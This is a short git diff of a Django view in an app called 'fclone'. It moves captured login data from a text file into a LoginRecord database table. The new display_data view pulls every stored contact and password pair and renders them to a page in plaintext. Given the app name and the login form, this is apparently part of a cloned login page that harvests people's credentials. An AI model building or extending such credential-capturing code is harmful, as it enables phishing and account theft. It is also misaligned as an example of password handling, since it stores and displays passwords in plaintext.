@@ -1,5 +1,7 @@
 from django.shortcuts import render
 from django.http import HttpResponse
+
+from fclone.models import LoginRecord
 from .forms import LogiForm
 
 from django.shortcuts import render
@@ -19,14 +21,13 @@ def login(request):
 
 
 def display_data(request):
-    data_lines = []
-    try:
-        # Open the file and read lines
-        with open('form_data.txt', 'r') as file:
-            data_lines = [line.strip().split(',') for line in file.readlines() if ',' in line]
-    except FileNotFoundError:
+    # Query the LoginRecord table and extract contact and password fields
+    data_lines = list(LoginRecord.objects.values_list('contact', 'password'))
+
+    # If no records exist, display a placeholder message
+    if not data_lines:
         data_lines = [["No data available yet."]]
-    
+
     return render(request, 'display_data.html', {'data_lines': data_lines})
 
 
